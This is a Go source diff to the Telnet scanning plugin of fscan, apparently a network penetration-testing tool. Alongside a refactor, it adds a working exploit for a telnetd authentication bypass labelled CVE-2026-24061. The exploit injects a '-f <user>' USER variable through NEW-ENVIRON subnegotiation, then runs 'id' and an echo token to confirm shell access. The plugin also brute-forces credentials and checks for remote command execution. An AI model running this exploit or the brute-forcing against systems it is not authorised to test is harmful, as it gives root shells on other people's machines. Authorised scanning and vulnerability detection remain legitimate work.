@@ -4,9 +4,11 @@ package services
 
 import (
 	"context"
+	"crypto/rand"
 	"fmt"
 	"net"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/shadow1ng/fscan/common"
@@ -16,14 +18,26 @@ import (
 
 // Telnet协议时间常量
 const (
-	telnetReadDelay      = 200 * time.Millisecond  // 读取间隔延迟
-	telnetRetryDelay     = 500 * time.Millisecond  // 重试延迟
-	telnetAuthDelay      = 1000 * time.Millisecond // 认证后等待延迟
-	telnetReadTimeout    = 2 * time.Second         // 读取超时
-	telnetBannerTimeout  = 3 * time.Second         // Banner读取超时
-	telnetRCECmdTimeout  = 5 * time.Second         // RCE命令执行超时
-	telnetRCEExtraTimeout = 10 * time.Second       // RCE验证额外超时
-	telnetMaxAttempts    = 10                      // 最大尝试次数
+	telnetReadDelay       = 200 * time.Millisecond  // 读取间隔延迟
+	telnetRetryDelay      = 500 * time.Millisecond  // 重试延迟
+	telnetAuthDelay       = 1000 * time.Millisecond // 认证后等待延迟
+	telnetReadTimeout     = 2 * time.Second         // 读取超时
+	telnetBannerTimeout   = 3 * time.Second         // Banner读取超时
+	telnetRCECmdTimeout   = 5 * time.Second         // RCE命令执行超时
+	telnetRCEExtraTimeout = 10 * time.Second        // RCE验证额外超时
+	telnetMaxAttempts     = 10                      // 最大尝试次数
+)
+
+// CVE-2026-24061 Telnet NEW-ENVIRON 选项常量
+const (
+	telnetIAC        = 0xFF // Telnet Interpret As Command
+	telnetSB         = 0xFA // Subnegotiation Begin
+	telnetSE         = 0xF0 // Subnegotiation End
+	telnetNEWENVIRON = 39   // NEW-ENVIRON option
+	telnetDO         = 0xFD // DO
+	telnetDONT       = 0xFE // DONT
+	telnetWILL       = 0xFB // WILL
+	telnetWONT       = 0xFC // WONT
 )
 
 // TelnetPlugin Telnet扫描插件
@@ -37,18 +51,19 @@ func NewTelnetPlugin() *TelnetPlugin {
 	}
 }
 
-func (p *TelnetPlugin) Scan(ctx context.Context, info *common.HostInfo, config *common.Config, state *common.State) *ScanResult {
+func (p *TelnetPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
+	config := session.Config
 	target := info.Target()
 
 	if config.DisableBrute {
-		return p.identifyService(ctx, info, config, state)
+		return p.identifyService(ctx, info, session)
 	}
 
 	// 检测未授权访问
-	if result := p.testUnauthAccess(ctx, info, config, state); result != nil && result.Success {
+	if result := p.testUnauthAccess(ctx, info, session); result != nil && result.Success {
 		common.LogVuln(i18n.Tr("telnet_service", target, result.Banner))
 		// 验证命令执行能力
-		if ok, osType, evidence := p.verifyCommandExecution(ctx, info, "", "", config, state); ok {
+		if ok, osType, evidence := p.verifyCommandExecution(ctx, info, "", "", session); ok {
 			common.LogVuln(i18n.Tr("telnet_unauth_rce", target, osType, evidence))
 		}
 		return result
@@ -70,16 +85,21 @@ func (p *TelnetPlugin) Scan(ctx context.Context, info *common.HostInfo, config *
 		creds[i] = Credential{Username: c.Username, Password: c.Password}
 	}
 
+	// CVE-2026-24061: 并发检测 Telnetd Authentication Bypass 漏洞
+	if cveResult := p.checkCVE202624061Concurrent(ctx, info, session, config); cveResult != nil {
+		return cveResult
+	}
+
 	// 使用公共框架进行并发凭据测试
-	authFn := p.createAuthFunc(info, config, state)
-	testConfig := DefaultConcurrentTestConfig(config)
+	authFn := p.createAuthFunc(info, session)
+	testConfig := DefaultConcurrentTestConfigWithTarget(config, info)
 
 	result := TestCredentialsConcurrently(ctx, creds, authFn, "telnet", testConfig)
 
 	if result.Success {
 		common.LogVuln(i18n.Tr("telnet_credential", target, result.Username, result.Password))
 		// 验证命令执行能力
-		if ok, osType, evidence := p.verifyCommandExecution(ctx, info, result.Username, result.Password, config, state); ok {
+		if ok, osType, evidence := p.verifyCommandExecution(ctx, info, result.Username, result.Password, session); ok {
 			common.LogVuln(i18n.Tr("telnet_credential_rce", target, result.Username, result.Password, osType, evidence))
 		}
 	}
@@ -88,22 +108,21 @@ func (p *TelnetPlugin) Scan(ctx context.Context, info *common.HostInfo, config *
 }
 
 // createAuthFunc 创建Telnet认证函数
-func (p *TelnetPlugin) createAuthFunc(info *common.HostInfo, config *common.Config, state *common.State) AuthFunc {
+func (p *TelnetPlugin) createAuthFunc(info *common.HostInfo, session *common.ScanSession) AuthFunc {
 	return func(ctx context.Context, cred Credential) *AuthResult {
-		return p.doTelnetAuth(ctx, info, cred, config, state)
+		return p.doTelnetAuth(ctx, info, cred, session)
 	}
 }
 
 // doTelnetAuth 执行Telnet认证
-func (p *TelnetPlugin) doTelnetAuth(ctx context.Context, info *common.HostInfo, cred Credential, config *common.Config, state *common.State) *AuthResult {
+func (p *TelnetPlugin) doTelnetAuth(ctx context.Context, info *common.HostInfo, cred Credential, session *common.ScanSession) *AuthResult {
 	target := info.Target()
 
 	resultChan := make(chan *AuthResult, 1)
 
 	go func() {
-		conn, err := common.WrapperTcpWithTimeout("tcp", target, config.Timeout)
+		conn, err := session.DialTCP(ctx, "tcp", target, session.Config.Timeout)
 		if err != nil {
-			state.IncrementTCPFailedPacketCount()
 			resultChan <- &AuthResult{
 				Success:   false,
 				ErrorType: classifyTelnetErrorType(err),
@@ -112,10 +131,9 @@ func (p *TelnetPlugin) doTelnetAuth(ctx context.Context, info *common.HostInfo, 
 			return
 		}
 
-		_ = conn.SetDeadline(time.Now().Add(config.Timeout))
+		_ = conn.SetDeadline(time.Now().Add(session.Config.Timeout))
 
 		if p.performTelnetAuth(conn, cred.Username, cred.Password) {
-			state.IncrementTCPSuccessPacketCount()
 			resultChan <- &AuthResult{
 				Success:   true,
 				Conn:      &telnetConnWrapper{conn},
@@ -124,7 +142,6 @@ func (p *TelnetPlugin) doTelnetAuth(ctx context.Context, info *common.HostInfo, 
 			}
 		} else {
 			_ = conn.Close()
-			state.IncrementTCPFailedPacketCount()
 			resultChan <- &AuthResult{
 				Success:   false,
 				ErrorType: ErrorTypeAuth,
@@ -192,21 +209,20 @@ func classifyTelnetErrorType(err error) ErrorType {
 }
 
 // testUnauthAccess 测试Telnet未授权访问
-func (p *TelnetPlugin) testUnauthAccess(ctx context.Context, info *common.HostInfo, config *common.Config, state *common.State) *ScanResult {
+func (p *TelnetPlugin) testUnauthAccess(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
 	target := info.Target()
 
 	resultChan := make(chan *ScanResult, 1)
 
 	go func() {
-		conn, err := common.WrapperTcpWithTimeout("tcp", target, config.Timeout)
+		conn, err := session.DialTCP(ctx, "tcp", target, session.Config.Timeout)
 		if err != nil {
-			state.IncrementTCPFailedPacketCount()
 			resultChan <- nil
 			return
 		}
 		defer func() { _ = conn.Close() }()
 
-		_ = conn.SetDeadline(time.Now().Add(config.Timeout))
+		_ = conn.SetDeadline(time.Now().Add(session.Config.Timeout))
 
 		buffer := make([]byte, 1024)
 		attempts := 0
@@ -229,7 +245,6 @@ func (p *TelnetPlugin) testUnauthAccess(ctx context.Context, info *common.HostIn
 			p.handleIACNegotiation(conn, buffer[:n])
 
 			if p.isShellPrompt(cleaned) {
-				state.IncrementTCPSuccessPacketCount()
 				resultChan <- &ScanResult{
 					Success: true,
 					Type:    plugins.ResultTypeVuln,
@@ -489,15 +504,14 @@ func (p *TelnetPlugin) isLoginFailed(data string) bool {
 }
 
 // identifyService Telnet服务识别
-func (p *TelnetPlugin) identifyService(ctx context.Context, info *common.HostInfo, config *common.Config, state *common.State) *ScanResult {
+func (p *TelnetPlugin) identifyService(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
 	target := info.Target()
 
 	resultChan := make(chan *ScanResult, 1)
 
 	go func() {
-		conn, err := common.WrapperTcpWithTimeout("tcp", target, config.Timeout)
+		conn, err := session.DialTCP(ctx, "tcp", target, session.Config.Timeout)
 		if err != nil {
-			state.IncrementTCPFailedPacketCount()
 			resultChan <- &ScanResult{
 				Success: false,
 				Service: "telnet",
@@ -507,12 +521,11 @@ func (p *TelnetPlugin) identifyService(ctx context.Context, info *common.HostInf
 		}
 		defer func() { _ = conn.Close() }()
 
-		_ = conn.SetDeadline(time.Now().Add(config.Timeout))
+		_ = conn.SetDeadline(time.Now().Add(session.Config.Timeout))
 
 		buffer := make([]byte, 2048)
 		n, err := conn.Read(buffer)
 		if err != nil {
-			state.IncrementTCPFailedPacketCount()
 			resultChan <- &ScanResult{
 				Success: false,
 				Service: "telnet",
@@ -520,8 +533,6 @@ func (p *TelnetPlugin) identifyService(ctx context.Context, info *common.HostInf
 			}
 			return
 		}
-
-		state.IncrementTCPSuccessPacketCount()
 
 		p.handleIACNegotiation(conn, buffer[:n])
 		cleaned := p.cleanResponse(string(buffer[:n]))
@@ -574,7 +585,7 @@ func (p *TelnetPlugin) identifyService(ctx context.Context, info *common.HostInf
 }
 
 // verifyCommandExecution 验证Telnet命令执行能力（RCE检测）
-func (p *TelnetPlugin) verifyCommandExecution(ctx context.Context, info *common.HostInfo, username, password string, config *common.Config, state *common.State) (bool, string, string) {
+func (p *TelnetPlugin) verifyCommandExecution(ctx context.Context, info *common.HostInfo, username, password string, session *common.ScanSession) (bool, string, string) {
 	target := info.Target()
 
 	type rceResult struct {
@@ -586,14 +597,14 @@ func (p *TelnetPlugin) verifyCommandExecution(ctx context.Context, info *common.
 	resultChan := make(chan rceResult, 1)
 
 	go func() {
-		conn, err := common.WrapperTcpWithTimeout("tcp", target, config.Timeout)
+		conn, err := session.DialTCP(ctx, "tcp", target, session.Config.Timeout)
 		if err != nil {
 			resultChan <- rceResult{}
 			return
 		}
 		defer func() { _ = conn.Close() }()
 
-		_ = conn.SetDeadline(time.Now().Add(config.Timeout + telnetRCEExtraTimeout))
+		_ = conn.SetDeadline(time.Now().Add(session.Config.Timeout + telnetRCEExtraTimeout))
 
 		// 需要认证时先登录
 		if username != "" || password != "" {
@@ -745,6 +756,264 @@ func (p *TelnetPlugin) drainBuffer(conn net.Conn) {
 			break
 		}
 	}
+}
+
+// checkCVE202624061Concurrent 并发检测多个用户，首个命中即返回
+func (p *TelnetPlugin) checkCVE202624061Concurrent(ctx context.Context, info *common.HostInfo, session *common.ScanSession, config *common.Config) *ScanResult {
+	cveUsers := config.Credentials.Userdict["telnet"]
+	if len(cveUsers) == 0 {
+		cveUsers = []string{"root", "admin", "administrator"}
+	}
+
+	type cveHit struct {
+		user     string
+		evidence string
+	}
+
+	ctx, cancel := context.WithCancel(ctx)
+	defer cancel()
+
+	ch := make(chan cveHit, 1)
+	var wg sync.WaitGroup
+
+	for _, user := range cveUsers {
+		wg.Add(1)
+		go func(u string) {
+			defer wg.Done()
+			if vuln, cveUser, evidence := p.checkCVE202624061(ctx, info, session, u); vuln {
+				select {
+				case ch <- cveHit{user: cveUser, evidence: evidence}:
+					cancel() // 通知其他 goroutine 停止
+				default:
+				}
+			}
+		}(user)
+	}
+
+	// 等待全部完成后关闭 channel
+	go func() {
+		wg.Wait()
+		close(ch)
+	}()
+
+	if hit, ok := <-ch; ok {
+		target := info.Target()
+		common.LogVuln(i18n.Tr("telnet_cve202624061", target, hit.user, hit.evidence))
+		return &ScanResult{
+			Success: true,
+			Type:    plugins.ResultTypeVuln,
+			Service: "telnet",
+			Banner:  fmt.Sprintf("CVE-2026-24061 Telnetd Authentication Bypass (user: %s)", hit.user),
+		}
+	}
+	return nil
+}
+
+// checkCVE202624061 检测 CVE-2026-24061 Telnetd Authentication Bypass 漏洞
+// 利用 NEW-ENVIRON (option 39) 子协商注入恶意环境变量,实现认证绕过
+// 返回 (是否漏洞, 触发用户名, 证据)
+func (p *TelnetPlugin) checkCVE202624061(ctx context.Context, info *common.HostInfo, session *common.ScanSession, user string) (bool, string, string) {
+	conn, err := session.DialTCP(ctx, "tcp", info.Target(), session.Config.Timeout)
+	if err != nil {
+		return false, "", ""
+	}
+	defer conn.Close()
+
+	chk := &cveChecker{
+		conn: conn,
+		user: user,
+		buf:  make([]byte, 4096),
+	}
+	return chk.run()
+}
+
+// cveChecker CVE-2026-24061 检测器 (基于验证过的 POC 逻辑)
+type cveChecker struct {
+	conn        net.Conn
+	user        string
+	exploitSent bool
+	buf         []byte
+}
+
+// sendPayload 发送 NEW-ENVIRON 恶意环境变量 payload
+func (e *cveChecker) sendPayload() {
+	payload := []byte{telnetIAC, telnetSB, telnetNEWENVIRON, 0, 0}
+	payload = append(payload, []byte("USER")...)
+	payload = append(payload, 1) // SEND indicator
+	payload = append(payload, []byte("-f "+e.user)...)
+	payload = append(payload, telnetIAC, telnetSE)
+	_, _ = e.conn.Write(payload)
+	e.exploitSent = true
+}
+
+// sendSubResp 响应服务端子协商请求
+func (e *cveChecker) sendSubResp(opt byte, data []byte) {
+	resp := []byte{telnetIAC, telnetSB, opt, 0}
+	resp = append(resp, data...)
+	resp = append(resp, telnetIAC, telnetSE)
+	_, _ = e.conn.Write(resp)
+}
+
+// parseIAC 解析 Telnet IAC 协商报文,返回非 IAC 数据部分
+func (e *cveChecker) parseIAC(data []byte) []byte {
+	var output []byte
+	i := 0
+	for i < len(data) {
+		if data[i] != telnetIAC {
+			output = append(output, data[i])
+			i++
+			continue
+		}
+		i++
+		if i >= len(data) {
+			break
+		}
+		cmd := data[i]
+		i++
+		if cmd == telnetIAC {
+			output = append(output, 0xFF) // IAC 转义
+			continue
+		}
+		// 子协商 (SB)
+		if cmd == telnetSB {
+			if i >= len(data) {
+				break
+			}
+			sbOpt := data[i]
+			i++
+			var sbData []byte
+			for i < len(data)-1 {
+				if data[i] == telnetIAC && data[i+1] == telnetSE {
+					i += 2
+					break
+				}
+				sbData = append(sbData, data[i])
+				i++
+			}
+			// 服务端要求回显数据 (SEND indicator = 1)
+			if len(sbData) > 0 && sbData[0] == 1 {
+				switch sbOpt {
+				case 24:
+					e.sendSubResp(24, []byte("xterm"))
+				case 32:
+					e.sendSubResp(32, []byte("38400,38400"))
+				case telnetNEWENVIRON:
+					if !e.exploitSent {
+						e.sendPayload()
+					}
+				}
+			}
+			continue
+		}
+		// DO/DONT/WILL/WONT 协商
+		if cmd == telnetDO || cmd == telnetDONT || cmd == telnetWILL || cmd == telnetWONT {
+			if i >= len(data) {
+				break
+			}
+			opt := data[i]
+			i++
+			switch cmd {
+			case telnetDO:
+				if opt == 24 || opt == 32 || opt == telnetNEWENVIRON {
+					_, _ = e.conn.Write([]byte{telnetIAC, telnetWILL, opt})
+				} else {
+					_, _ = e.conn.Write([]byte{telnetIAC, telnetWONT, opt})
+				}
+			case telnetWILL:
+				if opt == 1 || opt == 3 {
+					_, _ = e.conn.Write([]byte{telnetIAC, telnetDO, opt})
+				} else {
+					_, _ = e.conn.Write([]byte{telnetIAC, telnetDONT, opt})
+				}
+			case telnetWONT:
+				_, _ = e.conn.Write([]byte{telnetIAC, telnetDONT, opt})
+			case telnetDONT:
+				_, _ = e.conn.Write([]byte{telnetIAC, telnetWONT, opt})
+			}
+		}
+	}
+	return output
+}
+
+// readAll 读取连接中的所有可用数据，deadline 控制等待上限
+func (e *cveChecker) readAll(timeout time.Duration) []byte {
+	var out []byte
+	_ = e.conn.SetReadDeadline(time.Now().Add(timeout))
+	for {
+		n, err := e.conn.Read(e.buf)
+		if n > 0 {
+			out = append(out, e.parseIAC(e.buf[:n])...)
+			// 收到数据后缩短后续等待，快速收完尾包
+			_ = e.conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
+		}
+		if err != nil {
+			break
+		}
+	}
+	return out
+}
+
+// genToken 生成 16 位随机验证 token
+func (e *cveChecker) genToken() string {
+	b := make([]byte, 8)
+	_, _ = rand.Read(b)
+	return fmt.Sprintf("%x", b)
+}
+
+// extractEvidence 从输出中提取包含关键词的完整行作为证据,清理 \r 控制字符
+func (e *cveChecker) extractEvidence(data string, keywords []string) string {
+	for _, kw := range keywords {
+		for _, line := range strings.Split(data, "\n") {
+			line = strings.TrimSpace(strings.ReplaceAll(line, "\r", ""))
+			if line != "" && strings.Contains(line, kw) {
+				return "[" + line + "]"
+			}
+		}
+	}
+	return ""
+}
+
+// run 执行 CVE-2026-24061 检测流程
+// 优先级: id 命令输出 > echo token 回显
+func (e *cveChecker) run() (bool, string, string) {
+	// 阶段 1: IAC 协商（deadline 控制，不 sleep）
+	_ = e.conn.SetReadDeadline(time.Now().Add(3 * time.Second))
+	for {
+		n, err := e.conn.Read(e.buf)
+		if err != nil {
+			break
+		}
+		out := e.parseIAC(e.buf[:n])
+		if len(out) > 0 || e.exploitSent {
+			break
+		}
+	}
+
+	// 协商未触发 exploit 则主动发送
+	if !e.exploitSent {
+		e.sendPayload()
+		e.readAll(500 * time.Millisecond) // 消费协商回包
+	}
+
+	// 阶段 2: id 命令检测
+	_, _ = e.conn.Write([]byte("id\n"))
+	idOutput := string(e.readAll(2 * time.Second))
+
+	evidence := e.extractEvidence(idOutput, []string{"uid=", "gid="})
+	if evidence != "" {
+		return true, e.user, evidence
+	}
+
+	// 阶段 3: echo token 验证
+	token := e.genToken()
+	_, _ = e.conn.Write([]byte("echo " + token + "\n"))
+	result := string(e.readAll(1500 * time.Millisecond))
+	stripped := strings.Replace(result, "echo "+token, "", 1)
+	if strings.Contains(stripped, token) {
+		return true, e.user, "[echo " + token + "]"
+	}
+
+	return false, "", ""
 }
 
 func init() {
